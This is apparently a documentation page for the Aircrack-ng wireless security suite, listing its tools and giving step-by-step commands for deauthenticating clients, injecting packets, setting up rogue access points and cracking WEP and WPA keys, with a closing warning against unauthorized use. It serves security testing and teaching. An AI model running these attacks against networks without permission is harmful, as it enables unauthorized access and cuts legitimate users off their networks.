Basic Usage
===========

Aircrack-ng offers a wide range of tools and functionalities for Wi-Fi network assessment and security. Here are some of the essential components and basic usage:

1. **Aircrack-ng**: Used for cracking WEP and WPA-PSK keys.

   .. code-block:: bash

      aircrack-ng <capture-file>

2. **Airmon-ng**: Used for enabling and disabling monitor mode on network interfaces.

   .. code-block:: bash

      airmon-ng start <interface>

3. **Airodump-ng**: Used for capturing packets from wireless networks.

   .. code-block:: bash

      airodump-ng <interface>

4. **Aireplay-ng**: Used for packet injection and ARP request replay attacks.

   .. code-block:: bash

      aireplay-ng -0 1 -a <BSSID> -c <CLIENT> <interface>

5. **Airbase-ng**: Used for creating rogue access points.

   .. code-block:: bash

      airbase-ng -e <ESSID> -c <CHANNEL> <interface>

Examples
========

Example 1: Cracking WEP Key
---------------------------

1. Start by putting your wireless interface into monitor mode:

   .. code-block:: bash

      airmon-ng start <interface>

2. Capture data packets from the target network:

   .. code-block:: bash

      airodump-ng -w capture -c <channel> --bssid <BSSID> <interface>

3. Inject traffic into the network:

   .. code-block:: bash

      aireplay-ng -3 -b <BSSID> -h <your-adapter> <interface>

4. Crack the WEP key:

   .. code-block:: bash

      aircrack-ng -b <BSSID> capture*.cap

Example 2: Cracking WPA Key
---------------------------

1. Capture the WPA handshake:

   .. code-block:: bash

      airodump-ng -w capture -c <channel> --bssid <BSSID> <interface>

2. Deauthenticate a connected client to capture the handshake:

   .. code-block:: bash

      aireplay-ng -0 1 -a <BSSID> -c <CLIENT> <interface>

3. Crack the WPA key:

   .. code-block:: bash

      aircrack-ng -w wordlist.txt capture*.cap

Conclusion
==========

Aircrack-ng is a versatile toolset for Wi-Fi security analysis and testing. It allows you to assess the vulnerabilities of wireless networks and enhance their security. However, please note that using Aircrack-ng for unauthorized access to networks is illegal and unethical. Always use these tools responsibly and with the appropriate permissions.
